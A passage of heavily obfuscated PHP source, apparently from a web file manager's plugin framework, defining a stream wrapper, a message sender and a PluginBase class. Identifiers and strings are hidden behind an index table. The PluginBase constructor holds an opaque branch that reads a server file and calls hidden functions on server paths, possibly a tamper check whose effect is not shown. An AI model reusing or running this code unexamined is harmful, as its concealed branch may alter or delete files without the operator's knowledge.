$ôåŸ•‘ı[$À¶·†Õ£[2200]]; } unset($ôåŸ•‘ı); return parent::resetData($Ü½—¶‘¤); } private function getSort($Šá¦¿•£) { $Åëå— =& $_SERVER[œ—üé‹ê]; $Úşî = parent::listData(); $Á‘×¶˜§ = array_to_keyvalue($Úşî, $Åëå—[12], $Åëå—[2200]); if (!$Á‘×¶˜§) { $Á‘×¶˜§ = array(0); } $ÒÙÃâ´ò = $Šá¦¿•£ == $Åëå—[335] ? max($Á‘×¶˜§) : min($Á‘×¶˜§); return intval($ÒÙÃâ´ò); } } goto cĞİÈ§â; c“³ÀòÈ×à: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Õ×µâ›™, $ğè¤Àº = '') { $this->info = $this->info($Õ×µâ›™); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[œ—üé‹ê][87]]; $this->pathOpen = $Õ×µâ›™; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Õ×µâ›™])) { self::$_chunkBuffer[$Õ×µâ›™] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($¿¤Íç®) { $’ØŸç¼° = $this->fileSubstr($this->pose, $¿¤Íç®); $this->pose += strlen($’ØŸç¼°); return $’ØŸç¼°; } public function stream_tell() { return $this->pose; } public function stream_seek($÷ÉÃ¾¶†, $™»¤³¡‹) { $º“êû× =& $_SERVER[œ—üé‹ê]; if ($™»¤³¡‹ == SEEK_SET) { $this->pose = $÷ÉÃ¾¶†; } else { if ($™»¤³¡‹ == SEEK_CUR) { $this->pose += $÷ÉÃ¾¶†; } else { if ($™»¤³¡‹ == SEEK_END) { $this->pose = $this->info[$º“êû×[79]] + intval($÷ÉÃ¾¶†); } } } if ($÷ÉÃ¾¶† < 0) { $this->pose = $this->info[$º“êû×[79]] + $÷ÉÃ¾¶†; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[œ—üé‹ê][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ËÈèã, $·»í¬ï˜) { $¥ğ“–¤ =& $_SERVER[œ—üé‹ê]; $ÌÃÚØ„³ = $this->info($ËÈèã); return array($¥ğ“–¤[1508] => 0, $¥ğ“–¤[1809] => 0, $¥ğ“–¤[16] => 32768 + 511, $¥ğ“–¤[1810] => 0, $¥ğ“–¤[1811] => 0, $¥ğ“–¤[1812] => 0, $¥ğ“–¤[1813] => 0, $¥ğ“–¤[79] => $ÌÃÚØ„³[$¥ğ“–¤[79]], $¥ğ“–¤[1814] => $ÌÃÚØ„³[$¥ğ“–¤[1659]], $¥ğ“–¤[1771] => $ÌÃÚØ„³[$¥ğ“–¤[88]], $¥ğ“–¤[1770] => $ÌÃÚØ„³[$¥ğ“–¤[231]], $¥ğ“–¤[1815] => 0, $¥ğ“–¤[1816] => 0); } static $fileInfo = array(); public function info($ğ—‰ñ©›) { $˜ÆçÓì = $_SERVER[œ—üé‹ê][1817]; if (isset(self::$fileInfo[$ğ—‰ñ©›])) { return self::$fileInfo[$ğ—‰ñ©›]; } if (substr($ğ—‰ñ©›, 0, strlen($˜ÆçÓì)) != $˜ÆçÓì) { return !1; } self::$fileInfo[$ğ—‰ñ©›] = IO::info(substr($ğ—‰ñ©›, strlen($˜ÆçÓì))); return self::$fileInfo[$ğ—‰ñ©›]; } public static function read($‡ñâíûö, $ñİéÜš, $›éá°ÀŒ) { if (!isset(self::$_fopenCache[$‡ñâíûö])) { $‰ôˆÀ¢° = new StreamWrapperIO(); $‰ôˆÀ¢°->stream_open($‡ñâíûö); self::$_fopenCache[$‡ñâíûö] = $‰ôˆÀ¢°; } $‰ôˆÀ¢° = self::$_fopenCache[$‡ñâíûö]; return $‰ôˆÀ¢°->fileSubstr($ñİéÜš, $›éá°ÀŒ); } public static function _read($Ù¬«ê§“, $ÍÛ£•»¿, $Ê°‡œÅã) { $€¦ÃÁë =& $_SERVER[œ—üé‹ê]; $ó›á€ = fopen($Ù¬«ê§“, $€¦ÃÁë[1663]); if (!$ó›á€) { return $€¦ÃÁë[12]; } $è¶ÍİÇã = 8192; fseek($ó›á€, $ÍÛ£•»¿, SEEK_SET); $°éø–òÒ = $€¦ÃÁë[12]; $¾‰¶øìü = 0; while ($¾‰¶øìü < $Ê°‡œÅã) { $÷¦Æ—¤¿ = min($è¶ÍİÇã, $Ê°‡œÅã - $¾‰¶øìü); $°éø–òÒ .= fread($ó›á€, $÷¦Æ—¤¿); $¾‰¶øìü += $÷¦Æ—¤¿; } fclose($ó›á€); return $°éø–òÒ; } public function fileSubstr($ä‰óÜ–, $¼È£õ«–) { $Ë³ÂûŒ· =& $_SERVER[œ—üé‹ê]; $ÁÎ‰¬Ò = $this->info[$Ë³ÂûŒ·[79]]; $„¾Š»½ï = $ä‰óÜ–; $Úı„·î­ = $¼È£õ«–; if ($ä‰óÜ– < 0) { $ä‰óÜ– = $ÁÎ‰¬Ò + $ä‰óÜ–; } if ($¼È£õ«– === !1) { $¼È£õ«– = $ÁÎ‰¬Ò - $ä‰óÜ–; } if ($ä‰óÜ– + $¼È£õ«– > $ÁÎ‰¬Ò) { $¼È£õ«– = $ÁÎ‰¬Ò - $ä‰óÜ–; } if ($¼È£õ«– <= 0) { return $Ë³ÂûŒ·[12]; } if ($ä‰óÜ– < 0 || $ä‰óÜ– >= $ÁÎ‰¬Ò || $¼È£õ«– <= 0 || $¼È£õ«– > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\x69\154\x65\122\x65\141\x64\x20\145\162\162\x6f\x72\x21\40\163\x74\141\162\x74\x3d{$ä‰óÜ–}\x3b\154\x65\156\x67\164\150\x3d{$¼È£õ«–}\73\x20\x73\x69\172\x65\x3d{$ÁÎ‰¬Ò}\73"); } $¬•Òõ£Ğ = 64 * 1024; $Øıáã« =& self::$_chunkBuffer[$this->path]; if (!$Øıáã«) { $Øıáã« = array(); } $²½—™ï = 0; $óƒØæ½ = 0; $ÍøÀŒŸ¾ = $Ë³ÂûŒ·[12]; foreach ($Øıáã« as $²½—™ï => $ÍøÀŒŸ¾) { $²½—™ï = intval($²½—™ï); $óƒØæ½ = $²½—™ï + strlen($ÍøÀŒŸ¾); if ($ä‰óÜ– >= $óƒØæ½) { continue; } if ($ä‰óÜ– >= $²½—™ï && $ä‰óÜ– + $¼È£õ«– <= $óƒØæ½) { return substr($ÍøÀŒŸ¾, $ä‰óÜ– - $²½—™ï, $¼È£õ«–); } break; } if (count($Øıáã«) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Ë³ÂûŒ·[1818], $Ë³ÂûŒ·[1819] . count($Øıáã«) . "\x3b\x73\164\x61\162\164\75{$ä‰óÜ–}\x2c\x6c\x65\x6e\x67\164\x68\75{$¼È£õ«–}\x3b\160\157\163\145\72{$²½—™ï}\x7e{$óƒØæ½}"); throw new Exception($Ë³ÂûŒ·[1820]); } $ÈìÑÜ« = intval($ä‰óÜ– / $¬•Òõ£Ğ) * $¬•Òõ£Ğ; $¢ÖÄÄ³ = ceil(($ä‰óÜ– + $¼È£õ«–) / $¬•Òõ£Ğ) * $¬•Òõ£Ğ - $ÈìÑÜ«; $Œï°Ç« = IO::fileSubstr($this->path, $ÈìÑÜ«, $¢ÖÄÄ³); $Øıáã«[$ÈìÑÜ« . $Ë³ÂûŒ·[12]] = $Œï°Ç«; ksort($Øıáã«); $˜±’ª“ = substr($Œï°Ç«, $ä‰óÜ– - $ÈìÑÜ«, $¼È£õ«–); return $˜±’ª“; } private function log($•«¤Ç«ä, $ÕŸ÷ÃÕ) { $—£®ƒî =& $_SERVER[œ—üé‹ê]; $çËãõŠù = timeFloat() - $this->timeStart; write_log(sprintf($—£®ƒî[1821], $•«¤Ç«ä, $this->info[$—£®ƒî[32]], $çËãõŠù, $ÕŸ÷ÃÕ), $—£®ƒî[1367]); } } class Message { function __construct() { } public function send($öÓ¨ñ÷ = '', $•™ªâÕ = array(), $Ï¿Æœ¡ = "\164\145\x78\164") { $«êÉø®û =& $_SERVER[œ—üé‹ê]; $§¬£üÌ® = array($«êÉø®û[33] => $«êÉø®û[1287], $«êÉø®û[168] => $öÓ¨ñ÷); if (in_array($Ï¿Æœ¡, array($«êÉø®û[1287], $«êÉø®û[1822]))) { $§¬£üÌ®[$«êÉø®û[33]] = $Ï¿Æœ¡; } $•™ªâÕ = array($«êÉø®û[598] => isset($•™ªâÕ[$«êÉø®û[598]]) ? $•™ªâÕ[$«êÉø®û[598]] : $«êÉø®û[12], $«êÉø®û[684] => isset($•™ªâÕ[$«êÉø®û[684]]) ? $•™ªâÕ[$«êÉø®û[684]] : $«êÉø®û[12]); if (empty($öÓ¨ñ÷) || empty($•™ªâÕ[$«êÉø®û[598]]) && empty($•™ªâÕ[$«êÉø®û[684]])) { return !1; } $øâ‹¯•Á = array($«êÉø®û[1751] => $§¬£üÌ®, $«êÉø®û[1823] => $•™ªâÕ); Hook::trigger($«êÉø®û[1824], $øâ‹¯•Á); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ÇÄ¯¤Üò =& $_SERVER[œ—üé‹ê]; if ($_SERVER[$ÇÄ¯¤Üò[850]] != $_SERVER[$ÇÄ¯¤Üò[1042]]) { $É£úş„ = $ÇÄ¯¤Üò[1043]; $Š€®©øâ = $ÇÄ¯¤Üò[852]; $©ıØ§ğ = $_SERVER[$ÇÄ¯¤Üò[853]] . $ÇÄ¯¤Üò[854]; $›€˜™Ÿ™ = $Š€®©øâ($©ıØ§ğ); $Œ¦ÖÖ˜ñ = explode($ÇÄ¯¤Üò[285], $›€˜™Ÿ™); if (count($Œ¦ÖÖ˜ñ) < $ÇÄ¯¤Üò[713]) { $×õóÃ® = $ÇÄ¯¤Üò[855]; $×õóÃ®(); } $¼¤ã¿€• = $ÇÄ¯¤Üò[1044]; $¼¤ã¿€•($_SERVER[$ÇÄ¯¤Üò[1045]]); $¼¤ã¿€•($_SERVER[$ÇÄ¯¤Üò[853]] . $ÇÄ¯¤Üò[1046]); $«™ÓÙ¢ = 1; while ($«™ÓÙ¢ > 1) { $«™ÓÙ¢ = $«™ÓÙ¢ + 4; $ËÄÄ›Ë† = rawurlencode($«™ÓÙ¢ . $ÇÄ¯¤Üò[463]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ÇÄ¯¤Üò[1825]); $this->pluginName = str_replace($ÇÄ¯¤Üò[1825], $ÇÄ¯¤Üò[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ÇÄ¯¤Üò[8]; $this->pluginApi = appHostGet() . $ÇÄ¯¤Üò[1826] . $this->pluginName . $ÇÄ¯¤Üò[8]; $this->pluginHost = $config[$ÇÄ¯¤Üò[1827]] . $this->pluginName . $ÇÄ¯¤Üò[8]; $this->pluginHostDefault = $config[$ÇÄ¯¤Üò[1827]] . $this->pluginName . $ÇÄ¯¤Üò[8]; $åı¥êÅ = $config[$ÇÄ¯¤Üò[1828]]; if ($åı¥êÅ && strpos($ÇÄ¯¤Üò[50] . $åı¥êÅ . $ÇÄ¯¤Üò[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ÇÄ¯¤Üò[1829]] . $this->pluginName . $ÇÄ¯¤Üò[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[œ—üé‹ê][1830]); } protected function assign($îãøğ¼, $ˆßÛıŸ† = false) { if (is_array($îãøğ¼)) { $this->values = array_merge($this->values, $îãøğ¼); } else { $this->values[$îãøğ¼] = $ˆßÛıŸ†; } } protected function display($Äê×ûí) { extract($this->values); require $Äê×ûí; } final function hookRegist($ïì”Š¢õ) { $this->modelPlugin->appRegist($this->pluginName, $ïì”Š¢õ); } final function appIcon() { $¥¢ÈüËı =& $_SERVER[œ—üé‹ê]; $‡Ó³Î»† = $this->appPackage(); $³ÅĞÂÛô = $¥¢ÈüËı[12]; if (isset($‡Ó³Î»†[$¥¢ÈüËı[505]])) { if (isset($‡Ó³Î»†[$¥¢ÈüËı[505]][$¥¢ÈüËı[1831]])) { $³ÅĞÂÛô = $¥¢ÈüËı[1832] . $‡Ó³Î»†[$¥¢ÈüËı[505]][$¥¢ÈüËı[1831]] . $¥¢ÈüËı[1833]; } else { if ($‡Ó³Î»†[$¥¢ÈüËı[505]][$¥¢ÈüËı[1834]]) { $³ÅĞÂÛô = $¥¢ÈüËı[1835] . $‡Ó³Î»†[$¥¢ÈüËı[505]][$¥¢ÈüËı[1834]] . $¥¢ÈüËı[1836]; } } } return $³ÅĞÂÛô; } final function fileCanView($Ïùº¥ğ) { $¿»¾¨’à =& $_SERVER[œ—üé‹ê]; if (request_url_safe($Ïùº¥ğ)) { return !0; } if ($this->isShare($Ïùº¥ğ)) { ActionCall($¿»¾¨’à[1837], $Ïùº¥ğ); return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $Ôª¢œØ  = $¿»¾¨’à[1838] . rawurlencode(this_url()); show_tips(LNG($¿»¾¨’à[1839]) . $¿»¾¨’à[1840] . $Ôª¢œØ  . $¿»¾¨’à[1841] . LNG($¿»¾¨’à[1842]) . $¿»¾¨’à[1843], !1); } if (!Action($¿»¾¨’à[1844])->authCan($¿»¾¨’à[1845])) { show_tips(LNG($¿»¾¨’à[1846]) . $¿»¾¨’à[1847], !1); } ActionCall($¿»¾¨’à[1837], $Ïùº¥ğ); } final function isShare($àúÈÕù”) { $´êôñÆŞ = KodIO::parse($àúÈÕù”); return $´êôñÆŞ[$_SERVER[œ—üé‹ê][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Ó‹²Á³ø) { if (request_url_safe($Ó‹²Á³ø)) { return $Ó‹²Á³ø; } if (!$this->isShare($Ó‹²Á³ø)) { $Ó‹²Á³ø = $this->filePath($Ó‹²Á³ø, !1); } return Action($_SERVER[œ—üé‹ê][1359])->linkOut($Ó‹²Á³ø); } public function filePathLinkOut($âùš¹®) { if (request_url_safe($âùš¹®)) { return $âùš¹®; } $this->fileCanView($âùš¹®); return Action($_SERVER[œ—üé‹ê][1359])->link($âùš¹®); } final function filePath($ŒÔœêçõ, $şÅĞ²õµ = true, $¦¬Îèâ = false) { $êù­à•ä =& $_SERVER[œ—üé‹ê]; $¨ÙõçïÅ = $this->filePathGet($ŒÔœêçõ, $şÅĞ²õµ); if (!$this->fileInfo) { show_tips(LNG($êù­à•ä[105]), !1); } if ($¦¬Îèâ && isset($this->fileInfo[$êù­à•ä[557]]) && $this->fileInfo[$êù­à•ä[557]]) { $„ãŒ–ƒî = Model($êù­à•ä[560])->fileInfo($this->fileInfo[$êù­à•ä[557]]); if (!$„ãŒ–ƒî || !IO::exist($„ãŒ–ƒî[$êù­à•ä[87]])) { $ŠŞæÃ¨é = LNG($êù­à•ä[105]) . LNG($êù­à•ä[1848]); if (KodUser::isRoot() && isset($„ãŒ–ƒî[$êù­à•ä[87]])) { $ŠŞæÃ¨é .= $êù­à•ä[1849] . $„ãŒ–ƒî[$êù­à•ä[87]] . $êù­à•ä[1850]; } show_tips($ŠŞæÃ¨é); } } Hook::trigger($êù­à•ä[1851], $¨ÙõçïÅ); return $¨ÙõçïÅ; } final function filePathGet($¶Şıİ…û, $Íß­¥ı = true) { $ˆ¤©øšÃ =& $_SERVER[œ—üé‹ê]; $this->fileCanView($¶Şıİ…û); if ($ÏšÁÑˆ = $this->checkSharePath($¶Şıİ…û, $Íß­¥ı)) { return $ÏšÁÑˆ; } if (request_url_safe($¶Şıİ…û)) { $¬î®Ô˜ = parse_url_query($¶Şıİ…û); if (isset($¬î®Ô˜[$ˆ¤©øšÃ[1852]]) && isset($¬î®Ô˜[$ˆ¤©øšÃ[234]])) { $Ûİ†© = Mcrypt::decode($¬î®Ô˜[$ˆ¤©øšÃ[234]], Model($ˆ¤©øšÃ[882])->get($ˆ¤©øšÃ[883])); if ($Ûİ†©) { $this->fileInfo = IO::info($Ûİ†©); $this->fileInfo[$ˆ¤©øšÃ[1853]] = $¶Şıİ…û; $this->cachePath = $this->pluginCachePath($ˆ¤©øšÃ[12], $Íß­¥ı); return $Ûİ†©; } } $¶Şıİ…û = $this->_cacheHttpFile($¶Şıİ…û, $Íß­¥ı); $this->fileInfo = IO::info($¶Şıİ…û); } else { $this->fileInfo = IO::info($¶Şıİ…û); $this->cachePath = $this->pluginCachePath($ˆ¤©øšÃ[12], $Íß­¥ı); } return $¶Şıİ…û; } final function _cacheHttpFile($ÁÕœ³ºÖ, $İ¼É¸ù = true) { $†É¾«Ä” =& $_SERVER[œ—üé‹ê]; $‡¼„ñÅä = parse_url_query($ÁÕœ³ºÖ); $¢şüãêé = get_path_ext($ÁÕœ³ºÖ); if (isset($‡¼„ñÅä[$†É¾«Ä”[32]]) && $‡¼„ñÅä[$†É¾«Ä”[32]]) { $¢şüãêé = get_path_ext($‡¼„ñÅä[$†É¾«Ä”[32]]); } $“‰‘ÈøÂ = hash_path($ÁÕœ³ºÖ) . $†É¾«Ä”[10] . $¢şüãêé; $this->cachePath = $this->pluginCachePath($İ¼É¸ù ? $“‰‘ÈøÂ : $†É¾«Ä”[12]); $Ë…¼—Å˜ = IO::fileNameExist($this->cachePath, $“‰‘ÈøÂ); if ($Ë…¼—Å˜) { return KodIO::make($Ë…¼—Å˜); } $Ñé’È× = rtrim($this->cachePath, $†É¾«Ä”[8]) . $†É¾«Ä”[8] . $“‰‘ÈøÂ; return $this->pluginCacheFileSet($Ñé’È×, file_get_contents_nossl($ÁÕœ³ºÖ)); } final function checkSharePath($±¯Ï‘Ì, $å úº³Ü = true) { $üÛåäèœ =& $_SERVER[œ—üé‹ê]; if (!$this->isShare($±¯Ï‘Ì)) { return !1; } $ª”Ğ¹­Ş = Action($üÛåäèœ[1359])->sharePathInfo($±¯Ï‘Ì); if (!is_array($ª”Ğ¹­Ş) || !isset($ª”Ğ¹­Ş[$üÛåäèœ[87]])) { $Ô«£¤ØÙ = $GLOBALS[$üÛåäèœ[1854]]; show_json($Ô«£¤ØÙ ? $Ô«£¤ØÙ : LNG($üÛåäèœ[1855]), !1); } $this->fileInfo = $ª”Ğ¹­Ş; $this->cachePath = $this->pluginCachePath(!1, $å úº³Ü); return $ª”Ğ¹­Ş[$üÛåäèœ[87]]; } final function pluginCachePath($ÊÅÚûÈ• = '', $ÓùÑîº = false) { $éë²åí› =& $_SERVER[œ—üé‹ê]; if ($ÓùÑîº && is_array($this->fileInfo)) { $ÊÅÚûÈ• = kodIO::hashPath($this->fileInfo); } $Şí€®éº = rtrim(IO_PATH_SYSTEM_TEMP . $éë²åí›[1856] . $this->pluginName . $éë²åí›[8] . $ÊÅÚûÈ•, $éë²åí›[8]); $ü²•Û“š = IO::infoFullSimple($Şí€®éº); $æå»ú½ç = $ü²•Û“š && is_array($ü²•Û“š) ? $ü²•Û“š[$éë²åí›[87]] : $éë²åí›[12]; if (!$æå»ú½ç) { $æå»ú½ç = IO::mkdir($Şí€®éº); } return $æå»ú½ç; } final function pluginCacheFileSet($ÊŸáö›², $–Ï¾ŞŸ = '') { $’¨Ê¡õ¼ =& $_SERVER[œ—üé‹ê]; $¯•Í×Á = IO::infoFullSimple($ÊŸáö›²); if (!$¯•Í×Á) { return IO::mkfile($ÊŸáö›², $–Ï¾ŞŸ, REPEAT_REPLACE); } IO::setContent($¯•Í×Á[$’¨Ê¡õ¼[87]], $–Ï¾ŞŸ); return $¯•Í×Á[$’¨Ê¡õ¼[87]]; } final function pluginLocalFile($ö¼Ë¹Á = '') { $±ã¬õË =& $_SERVER[œ—üé‹ê]; $“¡ÙœË = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($“¡ÙœË)) { mk_dir($“¡ÙœË); } if (!$ö¼Ë¹Á) { return $“¡ÙœË; } $¬Î»öØŠ = IO::info($ö¼Ë¹Á); $¹ıÑèŸ = $±ã¬õË[1857] . KodIO::hashPath($¬Î»öØŠ) . $±ã¬õË[10] . $¬Î»öØŠ[$±ã¬õË[166]]; if (!checkExtSafe($¹ıÑèŸ)) { $¹ıÑèŸ = $¹ıÑèŸ . $±ã¬õË[1392]; } $ô§Æ¤³¡ = $“¡ÙœË . $¹ıÑèŸ; if (@file_exists($ô§Æ¤³¡)) { return $ô§Æ¤³¡; } return IO::copy($ö¼Ë¹Á, $“¡ÙœË, 0, $¹ıÑèŸ); } final function appPackage() { $Üò›‹ã =& $_SERVER[œ—üé‹ê]; if ($this->packageData) { return $this->packageData; } $Ç¦î‰­ = $this->parseFile($this->pluginPath . $Üò›‹ã[1858]); $this->parseLang($Ç¦î‰­); $ÜğÄËãâ = json_decode_force($Ç¦î‰­); if (!$ÜğÄËãâ) { return array(); } $ÊÙÃ©Íğ = Hook::filter($Üò›‹ã[1859], $ÜğÄËãâ); if ($ÊÙÃ©Íğ && is_array($ÊÙÃ©Íğ)) { $ÜğÄËãâ = $ÊÙÃ©Íğ; } $this->packageData = $ÜğÄËãâ; return $ÜğÄËãâ; } public function packageInfoGet($»Ë·ñö”) { $–­ÓÌ¨¾ = $this->appPackage(); return array_get_value($–­ÓÌ¨¾, $»Ë·ñö”); } public function packageVersion() { return $this->packageInfoGet($_SERVER[œ—üé‹ê][1860]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[œ—üé‹ê][1861]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[œ—üé‹ê][1862]); } public function echoJsAssign($šº¢˜ÔÌ, $•”ù”–ü) { $this->echoJsAssignArr[$šº¢˜ÔÌ] = $•”ù”–ü; } private function parseFile($ˆ‰Ñª†) { $úÎŒõ» =& $_SERVER[œ—üé‹ê]; $ôÓÍóŞƒ = file_get_contents_nossl($ˆ‰Ñª†); $å‡â‡Ù½ = array($úÎŒõ»[1863], $úÎŒõ»[1864], $úÎŒõ»[1865], $úÎŒõ»[1866], $úÎŒõ»[1867], $úÎŒõ»[1868], $úÎŒõ»[1869]); $úÕ¥¯ç = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$úÎŒõ»[92]][$úÎŒõ»[1870]]); foreach ($this->echoJsAssignArr as $“€ıú˜ => $’‘æ²ÖÀ) { $å‡â‡Ù½[] = $úÎŒõ»[1871] . $“€ıú˜ . $úÎŒõ»[1872]; $úÕ¥¯ç[] = is_array($’‘æ²ÖÀ) || is_object($’‘æ²ÖÀ) ? rawurlencode(json_encode($’‘æ²ÖÀ)) : $’‘æ²ÖÀ; } if (strstr($ôÓÍóŞƒ, $úÎŒõ»[1873])) { $¿øåíÕñ = rawurlencode(json_encode($this->pluginLangArr)); $ôÓÍóŞƒ = str_replace($úÎŒõ»[1873], $¿øåíÕñ, $ôÓÍóŞƒ); } if (strstr($ôÓÍóŞƒ, $úÎŒõ»[1874])) { $¿øåíÕñ = $¿øåíÕñ = rawurlencode(json_encode($this->getConfig())); $ôÓÍóŞƒ = str_replace($úÎŒõ»[1874], $¿øåíÕñ, $ôÓÍóŞƒ); } $ôÓÍóŞƒ = str_replace($å‡â‡Ù½, $úÕ¥¯ç, $ôÓÍóŞƒ); return $ôÓÍóŞƒ; } private function parseLang(&$ÀÎóëéŞ) { $”‘éÜ€Í =& $_SERVER[œ—üé‹ê]; $¬Ô’‡‹¦ = $”‘éÜ€Í[1875]; if (!strstr($ÀÎóëéŞ, $¬Ô’‡‹¦)) { return; } preg_match_all($”‘éÜ€Í[1876], $ÀÎóëéŞ, $Ü…ä•ã¾); if (!is_array($Ü…ä•ã¾) || count($Ü…ä•ã¾) == 0 || !is_array($Ü…ä•ã¾[0]) || count($Ü…ä•ã¾[0]) == 0) { return; } $¡“¯£·ş = array(); $£…à¿üã = array(); foreach ($Ü…ä•ã¾[0] as $ô¯šğßˆ) { $»«Ûœ¶½ = substr($ô¯šğßˆ, strlen($¬Ô’‡‹¦), -4); $»¨¢í¬å = LNG($»«Ûœ¶½); $¡“¯£·ş[] = $ô¯šğßˆ; $£…à¿üã[] = str_replace(array($”‘éÜ€Í[285], $”‘éÜ€Í[1246], $”‘éÜ€Í[417], $”‘éÜ€Í[118]), array($”‘éÜ€Í[53], $”‘éÜ€Í[53], $”‘éÜ€Í[12], $”‘éÜ€Í[1877]), $»¨¢í¬å); } $ÀÎóëéŞ = str_replace($¡“¯£·ş, $£…à¿üã, $ÀÎóëéŞ); } private function parseConfig(&$ÚûøÌ”) { $¨ã¥€´† =& $_SERVER[œ—üé‹ê]; $È¤İÉÊ‰ = $¨ã¥€´†[1878]; if (!strstr($ÚûøÌ”, $È¤İÉÊ‰)) { return; } preg_match_all($¨ã¥€´†[1879], $ÚûøÌ”, $Œ•¼È†²); if (!is_array($Œ•¼È†²) || count($Œ•¼È†²) == 0 || !is_array($Œ•¼È†²[0]) || count($Œ•¼È†²[0]) == 0) { return; } $ÏŞ‚¿‰ = $this->getConfig(); $Æğí§½ = array(); $ÍÖ¿·€ = array(); foreach ($Œ•¼È†²[0] as $•‹ÑÌŠ®) { $°¬•‡Ü = substr($•‹ÑÌŠ®, strlen($È¤İÉÊ‰), -2); $Æğí§½[] = $•‹ÑÌŠ®; $ÍÖ¿·€[] = _get($ÏŞ‚¿‰, $°¬•‡Ü); } $ÚûøÌ” = str_replace($Æğí§½, $ÍÖ¿·€, $ÚûøÌ”); } private function parsePackage(&$ºöŒ™ÓŠ) { $âÖÏÆ„œ =& $_SERVER[œ—üé‹ê]; $ëÊèì°Ö = $âÖÏÆ„œ[1880]; if (!strstr($ºöŒ™ÓŠ, $ëÊèì°Ö)) { return; } preg_match_all($âÖÏÆ„œ[1881], $ºöŒ™ÓŠ, $¾Ç¬ò•Í); if (!is_array($¾Ç¬ò•Í) || count($¾Ç¬ò•Í) == 0 || !is_array($¾Ç¬ò•Í[0]) || count($¾Ç¬ò•Í[0]) == 0) { return; } $­ÆØÖ«² = $this->appPackage(); $û½Ğ ¯ = array(); $¸¼˜ªìƒ = array(); foreach ($¾Ç¬ò•Í[0] as $ï¹Âõ§Ö) { $îñçŞç = substr($ï¹Âõ§Ö, strlen($ëÊèì°Ö), -2); $û½Ğ ¯[] = $ï¹Âõ§Ö; $¸¼˜ªìƒ[] = _get($­ÆØÖ«², $îñçŞç); } $ºöŒ™ÓŠ = str_replace($û½Ğ ¯, $¸¼˜ªìƒ, $ºöŒ™ÓŠ); } final function echoFile($«¹‰ÒÁ…, $ÆÓì¾ñÚ = false) { $…ËÕß¿¤ =& $_SERVER[œ—üé‹ê]; $ÇÑƒÉ¢ = $this->pluginPath . $«¹‰ÒÁ…; if (ACT == $…ËÕß¿¤[1882]) { echo $…ËÕß¿¤[1883] . $this->pluginName . $…ËÕß¿¤[8] . $«¹‰ÒÁ… . $…ËÕß¿¤[1884]; if (!file_exists($ÇÑƒÉ¢)) { echo $…ËÕß¿¤[1885]; return; } } $›ÙåÎ… = $this->parseFile($ÇÑƒÉ¢); $this->parseLang($›ÙåÎ…); $this->parseConfig($›ÙåÎ…); $this->parsePackage($›ÙåÎ…); if (is_array($ÆÓì¾ñÚ)) { $›ÙåÎ… = str_replace(array_keys($ÆÓì¾ñÚ), array_values($ÆÓì¾ñÚ), $›ÙåÎ…); } echo $…ËÕß¿¤[285] . $›ÙåÎ…; } private function checkVersion() { $‘’áª«â =& $_SERVER[œ—üé‹ê]; $ÛÃÑÙÍÁ = $this->appPackage(); $ÂÂñÄö = $this->getConfig(); if ($ÂÂñÄö[$‘’áª«â[1886]] == $ÛÃÑÙÍÁ[$‘’áª«â[1860]]) { return; } $this->regist(); $this->setConfig(array($‘’áª«â[1886] => $ÛÃÑÙÍÁ[$‘’áª«â[1860]])); } final function initLang() { $Ë³‚£­ø =& $_SERVER[œ—üé‹ê]; $çòçô—È = $Ë³‚£­ø[1887]; $õ‡´ ì¹ = $this->pluginPath . $Ë³‚£­ø[1888]; $°“×£Ø = I18n::getType(); $šêÉ’¨ï = array(); if (file_exists($õ‡´ ì¹ . $°“×£Ø . $Ë³‚£­ø[1003])) { $šêÉ’¨ï = (include $õ‡´ ì¹ . $°“×£Ø . $Ë³‚£­ø[1003]); } else { if ($°“×£Ø == $Ë³‚£­ø[1889] && !file_exists($õ‡´ ì¹ . $°“×£Ø . $Ë³‚£­ø[1003]) && file_exists($õ‡´ ì¹ . $Ë³‚£­ø[1890])) { $šêÉ’¨ï = (include $õ‡´ ì¹ . $Ë³‚£­ø[1890]); $°“×£Ø = $Ë³‚£­ø[1706]; } else { if (file_exists($õ‡´ ì¹ . $çòçô—È . $Ë³‚£­ø[1003])) { $šêÉ’¨ï = (include $õ‡´ ì¹ . $çòçô—È . $Ë³‚£­ø[1003]); $°“×£Ø = $çòçô—È; } } } if (!$šêÉ’¨ï || !is_array($šêÉ’¨ï)) { $šêÉ’¨ï = array(); } $ÆŒìØÆ„ = Hook::trigger($Ë³‚£­ø[1891], $šêÉ’¨ï, $this->pluginName, $°“×£Ø); if ($ÆŒìØÆ„ && is_array($ÆŒìØÆ„)) { $šêÉ’¨ï = $ÆŒìØÆ„; } if (@count($šêÉ’¨ï) > 0) { I18n::set($šêÉ’¨ï); } return $šêÉ’¨ï; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ÈÉ¹¿„·) { $ÆŒñè =& $_SERVER[œ—üé‹ê]; 